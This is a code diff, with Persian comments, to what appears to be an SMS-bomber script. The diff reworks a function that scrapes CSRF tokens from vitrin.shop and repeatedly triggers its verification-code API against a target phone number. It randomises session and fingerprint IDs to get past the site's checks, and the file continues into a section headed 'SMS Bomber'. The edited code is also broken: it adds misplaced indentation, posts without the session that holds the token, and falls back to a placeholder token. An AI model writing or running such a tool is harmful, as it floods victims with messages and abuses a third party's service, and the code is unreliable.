@@ -53,33 +53,47 @@ def check_internet():
 # SMS Service
 # ------------------------------
 
-def vitrin_shop(phone):
+
+        
+  def vitrin_shop(phone):
     import requests
     import re
     import uuid
     
     formatted_phone = "0" + phone.replace("+98", "")
     
+    # تابع برای دریافت توکن تازه
+    def get_fresh_token():
+        try:
+            session = requests.Session()
+            # دریافت صفحه اصلی برای توکن تازه
+            home_response = session.get("https://www.vitrin.shop/", timeout=10, headers={
+                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+            })
+            
+            # استخراج توکن از cookies
+            if 'XSRF-TOKEN' in session.cookies:
+                return session.cookies['XSRF-TOKEN']
+            
+            # استخراج توکن از HTML (اگر در صفحه وجود دارد)
+            token_patterns = [
+                r'name="_token" content="([^"]+)"',
+                r'name="csrf-token" content="([^"]+)"',
+                r'XSRF-TOKEN=([^;]+)',
+            ]
+            
+            for pattern in token_patterns:
+                match = re.search(pattern, home_response.text)
+                if match:
+                    return match.group(1)
+                    
+            return None
+        except:
+            return None
+    
     try:
-        session = requests.Session()
-        
-        # اول صفحه اصلی را برای گرفتن توکن‌ها
-        home_response = session.get("https://www.vitrin.shop/", timeout=10)
-        
-        # استخراج توکن از صفحه (اگر وجود دارد)
-        xsrf_token = None
-        # با الگوهای مختلف توکن را پیدا کن
-        token_patterns = [
-            r'name="_token" value="([^"]+)"',
-            r'XSRF-TOKEN=([^;]+)',
-            r'xsrf-token["\']?\s*[:=]\s*["\']([^"\']+)["\']'
-        ]
-        
-        for pattern in token_patterns:
-            match = re.search(pattern, home_response.text)
-            if match:
-                xsrf_token = match.group(1)
-                break
+        # دریافت توکن تازه
+        fresh_token = get_fresh_token()
         
         url = "https://www.vitrin.shop/api/v1/user/request_code"
         
@@ -93,13 +107,13 @@ def vitrin_shop(phone):
             "Accept": "application/json",
             "Content-Type": "application/json",
             "V-Session-ID": str(uuid.uuid4()),
-            "V-Fingerprint-ID": str(uuid.uuid4()),  # جدید каждый بار
-            "X-XSRF-TOKEN": xsrf_token if xsrf_token else "eyJpdiI6InNpQ0Q5TGdWVGs2Vkp2U2JQcG93NUE9PSIsInZhbHVlIjoiSmpSNmpvdnBQM2VtbE5DajU2aU5IdWlFRW5NQzVoTWZkeENRQ2dWUlhta3RRbkVmeU5LRGc5NFV6eDd6QTdkb3lEUkhQbk9jdGJrTDFSWmx3TmhxWC9JRVc5Y2JPU0p4NFg2OTRSK3grT0NsWFBHZExGMkNTUDhDWEkzcjhkVnUiLCJtYWMiOiJjZjk3NjAzNDkzMDBiMDYxMmI0NDI2NTNlZDBhNzg5NDQ5NzNjN2M4ODkyN2NjMDBjNjE5NDdiY2Q0MzlkYjNiIiwidGFnIjoiIn0=",
+            "V-Fingerprint-ID": str(uuid.uuid4()),
+            "X-XSRF-TOKEN": fresh_token if fresh_token else "توکن-پیشفرض-اینجا",
             "Origin": "https://www.vitrin.shop",
             "Referer": "https://www.vitrin.shop/",
         }
         
-        response = session.post(url, json=payload, headers=headers, timeout=10)
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
         
         print(f'{g}[+] Status: {response.status_code}{a}')
         print(f'{g}[+] Response: {response.text}{a}')
@@ -114,7 +128,7 @@ def vitrin_shop(phone):
     except Exception as e:
         print(f'{r}[!] vitrin_shop Exception: {e}{a}')
         return False
- 
+        
 
 # ------------------------------
 # SMS Bomber
